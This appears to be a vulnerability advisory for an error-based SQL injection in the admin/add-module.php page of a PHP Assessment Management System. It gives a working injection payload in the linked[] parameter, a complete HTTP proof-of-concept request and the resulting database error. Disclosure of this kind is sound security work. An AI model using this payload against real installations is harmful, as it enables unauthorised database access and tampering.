#   Assessment Management System admin/add-module.php SQL Injection Vulnerability

  A SQL injection vulnerability exists in the `admin/add-module.php` file of the Assessment Management System. The application
  directly concatenates user-controlled input from the `linked[]` parameter into an SQL `INSERT` statement without proper
  sanitization or parameterized statements. As a result, an attacker can inject arbitrary SQL syntax into the backend
  database query.

##  

##  Impact of the Vulnerability

  This vulnerability may allow an attacker to manipulate backend SQL queries, trigger database error-based responses, and
  potentially extract sensitive database information. In some cases, it may also affect data integrity by altering the
  values inserted into the `module` table.

##  

##  Payload

```
Supervisor'and/**/extractvalue(1,concat(char(126),md5(1958213939)))and's
```

Supervisor'and/**/extractvalue(1,concat(char(126),md5(1958213939)))and's



##   Proof of Concept

  Send the following request to the vulnerable endpoint:

```http
POST /admin/add-module.php HTTP/1.1
Host: assessment
Content-Type: application/x-www-form-urlencoded
Cookie: PHPSESSID=f11os756ltsdgbtk776pklo8cs

code=dgfs&name=dsfg&level=3&leader=s1&description=dsgf&linked%5B%5D=Supervisor'and/**/extractvalue(1,concat(char(126),md5(1958213939)))and's&addmore%5B%5D=&submit=Add+Module
```

  When the above payload is submitted through the `linked[]` parameter, the server responds with a database error message
  containing the injected MD5 marker:

  XPATH syntax error: '~3320503cc081cf7022d480a9f46fd9f'

  This demonstrates that user input is embedded into the SQL statement and executed by the database engine, confirming
  the presence of an error-based SQL injection vulnerability in `admin/add-module.php`.

##  

##  Source Download

```
 [Assessment Management In PHP With Source Code - Source Code & Projects](https://code-projects.org/assessment-management-in-php-with-source-code/)
```

[Assessment Management In PHP With Source Code - Source Code & Projects](https://code-projects.org/assessment-management-in-php-with-source-code/)



![image-20260603094910029](https://raw.githubusercontent.com/zzzxc643/images/main/image/image-20260603094910029.png)
